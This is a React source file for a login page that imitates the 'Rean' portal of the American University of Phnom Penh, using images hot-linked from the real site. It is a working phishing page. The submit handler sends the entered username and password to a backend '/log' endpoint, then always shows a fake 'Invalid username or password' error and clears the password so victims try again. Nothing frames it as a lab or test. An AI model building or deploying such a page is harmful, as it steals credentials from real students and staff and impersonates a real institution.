import React, { useState } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import "./login.css";

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  return (
    <div className="container-fluid vh-100 p-0">
      <div className="row g-0 h-100">
        {/* Left Side */}
        <div className="col-6 left-grid position-relative">
          <div className="w-100 h-100" style={{
            backgroundImage: "url('https://test.rean.gov.kh/v2/8e1bc2a1925d0cfa8a4fad5a8ecdd278.jpg')",
            backgroundSize: "cover",
            backgroundPosition: "center"
          }}>
            <div className="d-flex flex-column justify-content-center align-items-center h-100 text-white p-4" style={{ backgroundColor: "rgba(0,0,0,0.4)" }}>
              <h2>University Management System</h2>
              <p className="text-center">
                Prioritize user experience by creating an intuitive interface that is easy to navigate.
              </p>
              <p className="mt-auto">Prepared by</p>
            </div>
          </div>
        </div>

        {/* Right Side */}
        <div className="col-lg-6 d-flex justify-content-center align-items-center right-grid">
          <div className="w-75">
            <div className="text-center mb-4">
              <img src="https://test.rean.gov.kh/camu_attachment/get/664eb23422793a769a22e7b2" alt="inst-img" className="img-fluid mb-2" />
              <h5>American University of Phnom Penh</h5>
              <p>Not from "American University of Phnom Penh"?</p>
            </div>

            <h3 className="mb-3">Login to Rean</h3>
            <form onSubmit={handleSubmit} noValidate>
              <div className="mb-3">
                <label htmlFor="username" className="form-label">User name</label>
                <input
                  type="text"
                  id="username"
                  className="form-control"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
              </div>

              <div className="mb-3 position-relative">
                <label htmlFor="password" className="form-label">Password</label>
                <input
                  type="password"
                  id="password"
                  className="form-control"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                {/* Toggle password icon (optional) */}
                <span className="material-symbols-rounded position-absolute end-0 top-50 translate-middle-y pe-3" style={{ cursor: "pointer" }}>
                  visibility
                </span>
              </div>

              {msg && <div className="alert alert-danger">{msg}</div>}

              <div className="d-flex justify-content-between align-items-center mb-3">
                <a href="#" className="text-decoration-none">Forgot password?</a>
                <span>New to Rean? <button type="button" className="btn btn-link p-0">Create account</button></span>
              </div>

              <button type="submit" className="btn btn-primary w-100">Login</button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
